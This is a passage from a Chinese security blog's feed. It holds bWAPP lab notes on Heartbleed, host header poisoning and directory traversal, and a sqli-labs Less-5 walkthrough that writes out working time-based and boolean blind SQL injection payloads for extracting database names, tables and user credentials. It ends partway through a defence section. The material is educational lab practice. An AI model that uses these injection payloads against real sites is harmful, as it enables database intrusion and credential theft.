alt="在这里插入图片描述"></p><p>**</p><h2 id="BEAST-CRIME-BREACH-Attacks"><a href="#BEAST-CRIME-BREACH-Attacks" class="headerlink" title="BEAST/CRIME/BREACH Attacks"></a>BEAST/CRIME/BREACH Attacks</h2><p>**</p><p>这里的漏洞主要是针对TLS/SSL老版本加密算法存在的一些缺陷，配合中间人，已知明文攻击等方式去还原加密数据包</p><p>网页提示提供了OWASP提供的O-SAFT，这个其实主要可以用于检测站点HTTPS加密算法的安全性，基于perl语言，网站直接给的包并不能使用，可以去官网和git上下载</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Clear-Text-HTTP-Credentials"><a href="#Clear-Text-HTTP-Credentials" class="headerlink" title="Clear Text HTTP (Credentials)"></a>Clear Text HTTP (Credentials)</h2><p>**</p><p>low：明文登录凭据传输，burp也告诉你了</p><p><img src="https://img-blog.csdnimg.cn/20201101204223591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium和high：都是https</p><p>**</p><h2 id="Heartbleed-Vulnerability"><a href="#Heartbleed-Vulnerability" class="headerlink" title="Heartbleed Vulnerability"></a>Heartbleed Vulnerability</h2><p>**</p><p><strong>心脏滴血漏洞</strong>    <a href="https://www.meetsec.cn/index.php/archives/31/">大佬</a></p><p>Heartbleed错误允许Internet上的任何人读取受OpenSSL软件易受攻击版本保护的系统的内存。这会破坏用于识别服务提供商的密钥，并加密流量，用户的名称和密码以及实际内容。这允许攻击者窃听通信，直接从服务和用户窃取数据并模仿服务和用户。</p><p>网站非常良心提供了脚本，用法写的很清楚</p><p><img src="https://img-blog.csdnimg.cn/20201101204415745.png#pic_center" alt="在这里插入图片描述"><br>注销又登录了一次，此时使用py攻击</p><p><img src="https://img-blog.csdnimg.cn/20201101204513193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Host-Header-Attack-Reset-Poisoning"><a href="#Host-Header-Attack-Reset-Poisoning" class="headerlink" title="Host Header Attack (Reset Poisoning)"></a>Host Header Attack (Reset Poisoning)</h2><p>**</p><p>常见于PHP类型站点的密码找回处<a href="https://www.meetsec.cn/index.php/archives/31/">大佬</a></p><p>传递任意主机头的另一种方法是使用X-Forwarded-Host头。在某些配置中，此标头将重写Host标头的值。因此，可以提出以下请求。</p><p>许多Web应用程序依赖于HTTP 主机头来理解“它们在哪里”。</p><p>主机头的使用在PHP Web应用程序中尤为常见，但是，它肯定不是PHP Web应用程序特有的问题。</p><p>输入一个注册用户的邮箱，服务器会给该邮箱发送一个重置secret的邮件，里面有一个重置secret的链接。这个套路我们在重置密码邮件里其实挺常见的，但是那里主要想的攻击点在于破解链接里token的算法实现重置任意用户密码好了，现在这道题给了我们另外一个重置密码的思路，就是改“HOST”</p><p>这个题大佬写的非常好，我太菜了，就不了<a href="https://www.meetsec.cn/index.php/archives/31/">https://www.meetsec.cn/index.php/archives/31/</a></p><p>**</p><h2 id="HTML5-Web-Storage-Secret"><a href="#HTML5-Web-Storage-Secret" class="headerlink" title="HTML5 Web Storage (Secret)"></a>HTML5 Web Storage (Secret)</h2><p>**</p><p>HTML5拥有很多新特性，除了新增很多标签外，同时增加本地存储用户浏览数据的功能（web storage），主要是解决cookie本身的限制，同时减少服务端存储的内容。<br>web storage分为sessionstorage和localstorage<br>sessionStorage将数据保存在session中，浏览器关闭也就没了；而localStorage则一直将数据保存在客户端本地； </p><p><img src="https://img-blog.csdnimg.cn/2020110120511717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201101205122241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考链接：<a href="https://www.meetsec.cn/index.php/archives/31/">https://www.meetsec.cn/index.php/archives/31/</a></p><p>**</p><h2 id="POODLE-Vulnerability"><a href="#POODLE-Vulnerability" class="headerlink" title="POODLE Vulnerability"></a>POODLE Vulnerability</h2><p>**</p><p>POODLE 漏洞，这个是针对SSL 3.0协议的漏洞，攻击者可以利用该漏洞发动中间人攻击拦截用户浏览器和HTTPS站点的流量，然后窃取用户的敏感信息，如用户认证的cookies信息、账号信息等，SSL协议是为了解决HTTP明文传输的问题，漏洞有些是基于协议本身，有些是基于加密算法，而此次的POODLE漏洞，利用场景上看，更多被用于中间人获取HTTPS包中的cookie，利用前提在于攻击者处于中间人的位置，同时能控制客户端发送ajax数据包，通过控制客户端不断发送特殊明文包，经过SSL 3.0通过CBC模式进行加密，由于该模式的缺陷，从而算出cookie信息等。</p><p>**</p><h2 id="SSL-2-0-Deprecated-Protocol"><a href="#SSL-2-0-Deprecated-Protocol" class="headerlink" title="SSL 2.0 Deprecated Protocol"></a>SSL 2.0 Deprecated Protocol</h2><p>**</p><p>这个不是说SSL 2.0是漏洞，而是协议里包含结构性漏洞</p><pre><code>根据RFC6176的描述 SSL 2.0存在以下缺陷1. 消息认证使用MD5，MD5算法很早就被证明不安全；2. 握手包不受保护，中间人可以欺骗客户端选择比较弱的加密套件；3. 消息完整性和消息加密使用相同密码，如果客户端和服务端协商使用若加密算法将会很危险；4. 会话可以轻易被终止，中间人可以非常简单插入一个FIN包去关闭会话，而接收端都无法确认是否是会话正常终止；</code></pre><p>所以这是一个缺陷协议，根据页面提示，还是使用OWASP的O-Saft进行检测，不过还是和上面一样，对perl不熟悉导致检测报错，当然AWVS也能检测这个漏洞</p><p>**</p><h2 id="Text-Files-Accounts"><a href="#Text-Files-Accounts" class="headerlink" title="Text Files (Accounts)"></a>Text Files (Accounts)</h2><p>**</p><p>low：任意输入内容，会创建一个文件，链接为<a href="http://192.168.248.130/bWAPP/passwords/accounts.txt">http://192.168.248.130/bWAPP/passwords/accounts.txt</a></p><p>点开以后发现是明文，造成了信息泄漏</p><p><img src="https://img-blog.csdnimg.cn/20201101205821814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其次就是这个地址，讲道理没有登录的用户甚至没有权限的用户根本访问不了，而我们测试发现，即使是注销状态访问上面的链接，都是可以直接进行查看，所以如果攻击者利用扫描器进行目录爆破，很有可能找到这个文件</p><p><strong><em>注：以上A6篇多参考于大佬：<a href="https://www.meetsec.cn/index.php/archives/31/">https://www.meetsec.cn/index.php/archives/31/</a></em></strong></p><p>**</p><h2 id="Directory-Traversal-Directories"><a href="#Directory-Traversal-Directories" class="headerlink" title="Directory Traversal - Directories"></a>Directory Traversal - Directories</h2><p>**</p><p>low：未对输入的目录进行限制，可以访问任意目录</p><p><img src="https://img-blog.csdnimg.cn/20201101210144367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201101210148730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium：限制了一些符号，但还是可以访问当前目录下的任意文件</p><p><img src="https://img-blog.csdnimg.cn/20201101210222732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201101210227476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Directory-Traversal-Files"><a href="#Directory-Traversal-Files" class="headerlink" title="Directory Traversal - Files"></a>Directory Traversal - Files</h2><p>**</p><p>low：可以访问上级目录下的文件</p><p><img src="https://img-blog.csdnimg.cn/20201101210334257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium和high：限制了目录遍历，但是可以在当前目录下访问</p><p>**</p><h2 id="Host-Header-Attack-Cache-Poisoning"><a href="#Host-Header-Attack-Cache-Poisoning" class="headerlink" title="Host Header Attack (Cache Poisoning)"></a>Host Header Attack (Cache Poisoning)</h2><p>**</p><p>low：修改要访问的目录即可</p><p><img src="https://img-blog.csdnimg.cn/20201101210631858.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020110121063651.png#pic_center" alt="在这里插入图片描述"></p><p>medium和high：只能访问固定页面</p><p>**</p><h2 id="Host-Header-Attack-Reset-Poisoning-1"><a href="#Host-Header-Attack-Reset-Poisoning-1" class="headerlink" title="Host Header Attack (Reset Poisoning)"></a>Host Header Attack (Reset Poisoning)</h2><p>**</p><p>和A6的题重了，前边有</p><p>**</p><h2 id="SQLiteManager-Local-File-Inclusion"><a href="#SQLiteManager-Local-File-Inclusion" class="headerlink" title="SQLiteManager Local File Inclusion"></a>SQLiteManager Local File Inclusion</h2><p>**</p><p>**</p><h2 id="Remote-amp-Local-File-Inclusion-RFI-LFI"><a href="#Remote-amp-Local-File-Inclusion-RFI-LFI" class="headerlink" title="Remote &amp; Local File Inclusion (RFI/LFI)"></a>Remote &amp; Local File Inclusion (RFI/LFI)</h2><p>**</p><p>**</p><h2 id="Restrict-Device-Access"><a href="#Restrict-Device-Access" class="headerlink" title="Restrict Device Access"></a>Restrict Device Access</h2><p>**</p><p>**</p><h2 id="Restrict-Folder-Access"><a href="#Restrict-Folder-Access" class="headerlink" title="Restrict Folder Access"></a>Restrict Folder Access</h2><p>**</p><p>**</p><h2 id="Server-Side-Request-Forgery-SSRF"><a href="#Server-Side-Request-Forgery-SSRF" class="headerlink" title="Server Side Request Forgery (SSRF)"></a>Server Side Request Forgery (SSRF)</h2><p>**</p><p>**</p><h2 id="XML-External-Entity-Attacks-XXE"><a href="#XML-External-Entity-Attacks-XXE" class="headerlink" title="XML External Entity Attacks (XXE)"></a>XML External Entity Attacks (XXE)</h2><p>**</p><p>**</p><h2 id="CSRF-Change-Password"><a href="#CSRF-Change-Password" class="headerlink" title="CSRF (Change Password)"></a>CSRF (Change Password)</h2><p>**</p><p>**</p><h2 id="CSRF-Change-Secret"><a href="#CSRF-Change-Secret" class="headerlink" title="CSRF (Change Secret)"></a>CSRF (Change Secret)</h2><p>**</p><p>**</p><h2 id="CSRF-Transfer-Amount"><a href="#CSRF-Transfer-Amount" class="headerlink" title="CSRF (Transfer Amount)"></a>CSRF (Transfer Amount)</h2><p>**</p><p>**</p><h2 id="Buffer-Overflow-Local"><a href="#Buffer-Overflow-Local" class="headerlink" title="Buffer Overflow (Local)"></a>Buffer Overflow (Local)</h2><p>**</p><p>**</p><h2 id="Buffer-Overflow-Remote"><a href="#Buffer-Overflow-Remote" class="headerlink" title="Buffer Overflow (Remote)"></a>Buffer Overflow (Remote)</h2><p>**</p><p>**</p><h2 id="Drupal-SQL-Injection-Drupageddon"><a href="#Drupal-SQL-Injection-Drupageddon" class="headerlink" title="Drupal SQL Injection (Drupageddon)"></a>Drupal SQL Injection (Drupageddon)</h2><p>**</p><p>**</p><h2 id="Heartbleed-Vulnerability-1"><a href="#Heartbleed-Vulnerability-1" class="headerlink" title="Heartbleed Vulnerability"></a>Heartbleed Vulnerability</h2><p>**</p><p>**</p><h2 id="PHP-CGI-Remote-Code-Execution"><a href="#PHP-CGI-Remote-Code-Execution" class="headerlink" title="PHP CGI Remote Code Execution"></a>PHP CGI Remote Code Execution</h2><p>**</p><p>**</p><h2 id="PHP-Eval-Function"><a href="#PHP-Eval-Function" class="headerlink" title="PHP Eval Function"></a>PHP Eval Function</h2><p>**</p><p>**</p><h2 id="phpMyAdmin-BBCode-Tag-XSS-1"><a href="#phpMyAdmin-BBCode-Tag-XSS-1" class="headerlink" title="phpMyAdmin BBCode Tag XSS"></a>phpMyAdmin BBCode Tag XSS</h2><p>**</p><p>**</p><h2 id="Shellshock-Vulnerability-CGI"><a href="#Shellshock-Vulnerability-CGI" class="headerlink" title="Shellshock Vulnerability (CGI)"></a>Shellshock Vulnerability (CGI)</h2><p>**</p><p>**</p><h2 id="SQLiteManager-Local-File-Inclusion-1"><a href="#SQLiteManager-Local-File-Inclusion-1" class="headerlink" title="SQLiteManager Local File Inclusion"></a>SQLiteManager Local File Inclusion</h2><p>**</p><p>**</p><h2 id="SQLiteManager-PHP-Code-Injection"><a href="#SQLiteManager-PHP-Code-Injection" class="headerlink" title="SQLiteManager PHP Code Injection"></a>SQLiteManager PHP Code Injection</h2><p>**</p><p>**</p><h2 id="SQLiteManager-XSS-1"><a href="#SQLiteManager-XSS-1" class="headerlink" title="SQLiteManager XSS"></a>SQLiteManager XSS</h2><p>**</p><p>**</p><h2 id="Unvalidated-Redirects-amp-Forwards-1"><a href="#Unvalidated-Redirects-amp-Forwards-1" class="headerlink" title="Unvalidated Redirects &amp; Forwards (1)"></a>Unvalidated Redirects &amp; Forwards (1)</h2><p>**</p><p>**</p><h2 id="Unvalidated-Redirects-amp-Forwards-2"><a href="#Unvalidated-Redirects-amp-Forwards-2" class="headerlink" title="Unvalidated Redirects &amp; Forwards (2)"></a>Unvalidated Redirects &amp; Forwards (2)</h2><p>**</p><p>**</p><h2 id="ClickJacking-Movie-Tickets"><a href="#ClickJacking-Movie-Tickets" class="headerlink" title="ClickJacking (Movie Tickets)"></a>ClickJacking (Movie Tickets)</h2><p>**</p><p>**</p><h2 id="Client-Side-Validation-Password"><a href="#Client-Side-Validation-Password" class="headerlink" title="Client-Side Validation (Password)"></a>Client-Side Validation (Password)</h2><p>**</p><p>**</p><h2 id="HTTP-Parameter-Pollution"><a href="#HTTP-Parameter-Pollution" class="headerlink" title="HTTP Parameter Pollution"></a>HTTP Parameter Pollution</h2><p>**</p><p>**</p><h2 id="HTTP-Response-Splitting"><a href="#HTTP-Response-Splitting" class="headerlink" title="HTTP Response Splitting"></a>HTTP Response Splitting</h2><p>**</p><p>**</p><h2 id="HTTP-Verb-Tampering"><a href="#HTTP-Verb-Tampering" class="headerlink" title="HTTP Verb Tampering"></a>HTTP Verb Tampering</h2><p>**</p><p>**</p><h2 id="Information-Disclosure-Favicon"><a href="#Information-Disclosure-Favicon" class="headerlink" title="Information Disclosure - Favicon"></a>Information Disclosure - Favicon</h2><p>**</p><p>**</p><h2 id="Information-Disclosure-Headers"><a href="#Information-Disclosure-Headers" class="headerlink" title="Information Disclosure - Headers"></a>Information Disclosure - Headers</h2><p>**</p><p>**</p><h2 id="Information-Disclosure-PHP-version"><a href="#Information-Disclosure-PHP-version" class="headerlink" title="Information Disclosure - PHP version"></a>Information Disclosure - PHP version</h2><p>**</p><p>**</p><h2 id="Information-Disclosure-Robots-File"><a href="#Information-Disclosure-Robots-File" class="headerlink" title="Information Disclosure - Robots File"></a>Information Disclosure - Robots File</h2><p>**</p><p>**</p><h2 id="Insecure-iFrame-Login-Form"><a href="#Insecure-iFrame-Login-Form" class="headerlink" title="Insecure iFrame (Login Form)"></a>Insecure iFrame (Login Form)</h2><p>**</p><p>**</p><h2 id="Unrestricted-File-Upload"><a href="#Unrestricted-File-Upload" class="headerlink" title="Unrestricted File Upload"></a>Unrestricted File Upload</h2><p>**</p><p>**</p><h2 id="Client-Access-Policy-File"><a href="#Client-Access-Policy-File" class="headerlink" title="Client Access Policy File"></a>Client Access Policy File</h2><p>**</p><p>**</p><h2 id="Cross-Domain-Policy-File"><a href="#Cross-Domain-Policy-File" class="headerlink" title="Cross-Domain Policy File"></a>Cross-Domain Policy File</h2><p>**</p><p>**</p><h2 id="Evil-666-Fuzzing-Page"><a href="#Evil-666-Fuzzing-Page" class="headerlink" title="Evil 666 Fuzzing Page"></a>Evil 666 Fuzzing Page</h2><p>**</p><p>**</p><h2 id="Manual-Intervention-Required"><a href="#Manual-Intervention-Required" class="headerlink" title="Manual Intervention Required!"></a>Manual Intervention Required!</h2><p>**</p><p>**</p><h2 id="Unprotected-Admin-Portal"><a href="#Unprotected-Admin-Portal" class="headerlink" title="Unprotected Admin Portal"></a>Unprotected Admin Portal</h2><p>**</p><p>**</p><h2 id="We-Steal-Secrets…-html"><a href="#We-Steal-Secrets…-html" class="headerlink" title="We Steal Secrets…(html)"></a>We Steal Secrets…(html)</h2><p>**</p><p>**</p><h2 id="we-Steal-Secrets…-plain"><a href="#we-Steal-Secrets…-plain" class="headerlink" title="we Steal Secrets… (plain)"></a>we Steal Secrets… (plain)</h2><p>**</p><p>**</p><h2 id="wSDL-File-Web-Services-SOAP"><a href="#wSDL-File-Web-Services-SOAP" class="headerlink" title="wSDL File (Web Services/SOAP)"></a>wSDL File (Web Services/SOAP)</h2><p>**</p><p>有好多还没写，后面慢慢补吧(ง •̀_•́)ง(ง •̀_•́)ง(ง •̀_•́)ง(ง •̀_•́)ง(ง •̀_•́)ง</p><p>mark的后面也会努力学习</p><p>文章中部分参考大佬的，十分感谢<del>(≥▽≤)/</del>(≥▽≤)/<del>(≥▽≤)/</del></p><p>2020.11.1   公瑾</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab(5~6详解)</title>
      <link href="2020/10/17/sqli-lab(5-6%E8%AF%A6%E8%A7%A3)/"/>
      <url>2020/10/17/sqli-lab(5-6%E8%AF%A6%E8%A7%A3)/</url>
      
        <content type="html"><![CDATA[<p>**</p><h2 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h2><p>**</p><p><strong>知识点：1，时间延迟型手工注入；布尔型手工注入；使用concat聚合函数<br>2，payload原理及防御措施<br>3，sqlmap真香，脚本也好使</strong></p><p>**</p><h2 id="0x0a-时间延迟型手工注入"><a href="#0x0a-时间延迟型手工注入" class="headerlink" title="0x0a 时间延迟型手工注入"></a>0x0a 时间延迟型手工注入</h2><p>**</p><p>ps: 什么是时间盲注，时间盲注就是页面不会有回显，没有回显怎么办？这时候我们可以通过sleep（），让他沉睡<br>为什么通过sleep() 可以判断是否存在时间盲注，因为只要执行了，就说明网址存在交互，存在交互就存在漏洞<br>sql注入本质或者条件：<br>1，用户可以控制输入<br>2，拼接了用户输入的数据，并且去成功的执行了</p><p><em>即，如果语句正确就有延迟，加载慢，得等；不对，一下下就好了，可以通过浏览器的刷新提示观察延迟情况</em></p><p><strong>核心语句：?id=1’ and if(报错型payload核心部分,sleep(5),1)–+</strong></p><p><strong>判断有无注入点</strong></p><p><img src="https://img-blog.csdnimg.cn/20201017204549603.png#pic_center" alt="在这里插入图片描述"></p><p>从源码里看到单引号包围查询语句</p><p>判断的时候闭合掉，然后sleep(x), x是几都可以，指在交互过程中，你下的睡眠命令执行时间，通过时间延迟判断盲注</p><p><img src="https://img-blog.csdnimg.cn/20201017204912933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等待5~7秒左右，没有回显，存在注入点</p><p><strong>判断数据库长度</strong></p><p>使用  <strong>if() 函数</strong></p><p>i<em>f(exp1,exp2,exp3)<br>如果exp1语句正确，那么就会执行exp2，如果不正确，就会执行exp3<br>所以我们第一个exp可以写：length(database())=x<br>exp2:  sleep(5)<br>exp3 :  1</em></p><p>这时候长度x可以用<strong>二分法</strong>（节约时间）</p><p>这时候再代入if这里面</p><p><img src="https://img-blog.csdnimg.cn/20201017205527813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>二分法多试几次，最后判断为8</p><p><img src="https://img-blog.csdnimg.cn/202010172055490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>查库名</strong></p><p>这里还是推荐二分法，不然一个个试太慢了</p><p><img src="https://img-blog.csdnimg.cn/20201017210249705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201017210305524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017210312741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201017210320285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017210326318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>除了这个语句，还可以用<strong>substr和ascii</strong></p><p>?id=1’ and if(ascii(substr(database(),1,1))&gt;=50,sleep(5),1)–+<br>ps:这里比较的是字母的ascii值</p><p><strong>查表名</strong></p><p><img src="https://img-blog.csdnimg.cn/20201017210816430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里说一下，可以选择一个个爆破，查出所有的，也可以定向爆破，我这里是定向爆破，即直接写出users表名，在limit里变，最后在limit3，1可以查询出，另一种就limit1,1),1)=’’,二分法试出1的表名，然后2，3，才能有users（所以定向爆破快（sqlmap更快。。。））</p><p><img src="https://img-blog.csdnimg.cn/20201017211225875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>查列名</strong></p><p>同上，不再啰嗦</p><p><img src="https://img-blog.csdnimg.cn/20201017211346162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201017211402266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>查字段</strong></p><p>二分法</p><p><img src="https://img-blog.csdnimg.cn/20201017211519542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017211546811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>username同理</p><p>注意limit 从0开始。一直试爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p><p>**</p><h2 id="0x0b-布尔型手工注入"><a href="#0x0b-布尔型手工注入" class="headerlink" title="0x0b 布尔型手工注入"></a>0x0b 布尔型手工注入</h2><p>**</p><p>在布尔型注入中，<strong>正确会回显，错误没有回显</strong></p><p>与上边的时间延迟型比起来，去掉sleep部分</p><p>其他步骤操作差不多</p><pre><code class="python">?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code></pre><pre><code class="python">?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; --+</code></pre><p>不再多说，仿照上文编写payload即可</p><p>**</p><h2 id="0x0c-使用concat聚合函数"><a href="#0x0c-使用concat聚合函数" class="headerlink" title="0x0c 使用concat聚合函数"></a>0x0c 使用concat聚合函数</h2><p>**</p><p>使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。这样通过回显不就能看见信息了吗</p><p>步骤一样，payload不同，简单贴出，参考对比学习</p><p><img src="https://img-blog.csdnimg.cn/20201017212620798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017212656551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020101721270963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017212731879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020101721274033.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201017212751217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改limit x,1 可以显示第x个用户的password和username  （‘[’是分隔符），这里是1，3个用户</p><p>**</p><h2 id="0x0d-payload原理及防御"><a href="#0x0d-payload原理及防御" class="headerlink" title="0x0d payload原理及防御"></a>0x0d payload原理及防御</h2><p>**</p><p>1，时间延迟型的payload原理前文提及，就是通过执行命令，造成延迟，判断<br>2，布尔型，页面只返回True和False两种类型页面，count(*)计数   concat()连接字符   floor()重复数据，返回0,1两个值  group by 进行分组 rand(0)避免数据重复造成的错误，透过回显，进行判断<br>3，concat聚合函数，即双查询，例，Select concat((select database())); 真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的数据库查出来，然后把结果传入到concat函数。双注入查询需要理解四个函数/语句Rand() //随机函数 ，Floor() //取整函数，Count() //汇总函数 ，Group by clause //分组语句，具体并不是很理解，看<a href="http://www.2cto.com/article/201303/192718.html">大佬</a></p><p>4，防御：1），参数化查询是目前防范 SQL注入攻击效果最为明显的技术．它的优势主要表现为：首先，通过参数的 